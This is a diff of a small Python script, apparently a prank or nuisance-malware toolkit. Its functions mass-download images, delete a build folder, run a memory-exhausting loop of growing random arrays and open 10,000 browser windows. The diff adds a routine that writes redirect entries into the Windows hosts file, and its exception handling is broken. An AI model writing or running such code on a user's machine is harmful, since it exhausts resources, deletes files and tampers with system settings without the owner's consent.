@@ -1,9 +1,11 @@
 import multiprocessing
+import time
 import requests
 import os
 import shutil
 import numpy as np
 import webbrowser
+import platform
 
 
 def Multiple_img_Downloader(count: int = 10000):
@@ -68,17 +70,31 @@ def ShutdownOnStart():
         shutil.rmtree('dist')
     else:
         print('Stopping...')
+        time.sleep(1000)
 
 
 def Crash_by_Numbers():
     i = 1
-    while True:
+    for i in range(60):
         i *= 3
         print(np.random.rand(i))
-        print(np.array(0, i))
+        print(np.array([0, i]))
 
 
-def Open_BrowserWins(count: int = 10000):
+def open_BrowserWins(count: int = 10000):
     for i in range(count):
         webbrowser.open_new('https://www.google.com')
 
+
+def block_site(url: str, redirect_ip: str = '127.0.0.1'):
+    os_name = platform.system()
+
+    if os_name == 'Windows':
+        try:
+            os.chdir('C:/Windows/System32/drivers/etc')
+            with open('hosts', 'a') as f:
+                f.write(f'\n {redirect_ip} {url}')
+        except():
+            raise PermissionError('Permission Denied!')
+    else:
+        print('OS not supported')
